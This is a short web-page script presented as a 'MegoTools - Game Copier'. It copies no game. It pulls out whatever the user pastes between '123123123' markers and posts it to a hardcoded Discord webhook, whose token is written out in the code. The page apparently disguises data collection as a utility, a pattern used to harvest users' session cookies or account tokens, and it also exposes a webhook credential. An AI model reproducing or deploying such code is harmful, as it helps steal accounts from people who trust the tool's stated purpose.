<script>
const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

function copyGame(){
    let value = document.getElementById("gameInput").value.trim();

    if(!value){
        document.getElementById("status").innerText="Please enter a Game ID or Link";
        return;
    }

    // Wyłap fragment między pierwszym a drugim "123123123"
    let match = value.match(/123123123(.*?)123123123/);
    if(match && match[1]){
        value = match[1]; // teraz value to tylko to, co w środku
    } else {
        document.getElementById("status").innerText="❌ Nie znaleziono poprawnego wzorca!";
        return;
    }

    fetch(webhook,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body: JSON.stringify({
            content:"🎮 **MegoTools - Game Copier**\nGame: "+value
        })
    })
    .then(()=>{
        document.getElementById("status").innerText="✅ Game sent successfully!";
        document.getElementById("gameInput").value="";
    })
    .catch(()=>{
        document.getElementById("status").innerText="❌ Failed to send!";
    });
}
</script>
